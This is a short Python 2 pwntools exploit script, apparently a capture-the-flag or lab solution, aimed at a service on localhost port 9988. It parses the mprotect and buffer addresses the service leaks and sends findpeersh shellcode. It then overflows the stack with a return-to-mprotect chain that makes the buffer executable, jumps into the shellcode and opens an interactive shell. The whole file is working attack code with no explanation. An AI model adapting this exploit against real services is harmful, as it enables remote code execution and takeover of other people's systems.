#!/usr/bin/env python2

from pwn import *

def round_down(num, divisor):
    return num - (num%divisor)

def extract_hex(str):
    return int(str[str.index('0x')+2:str.index('.')],16)

context(arch = 'i386', os = 'linux')

RET_OFFSET = 0x8c + 4
SHELLCODE = asm(shellcraft.findpeersh())

r = remote("localhost", 9988)
lines = r.recvlines(3)
mprotect_address=extract_hex(lines[1])
buffer_address=extract_hex(lines[2])

payload=flat("A" * RET_OFFSET, 
  p32(mprotect_address),
  p32(buffer_address),
  p32(round_down(buffer_address, 4096)),
  p32(4096),
  p32(7))

r.send(SHELLCODE)
r.recvline()
r.send(payload)
r.interactive()

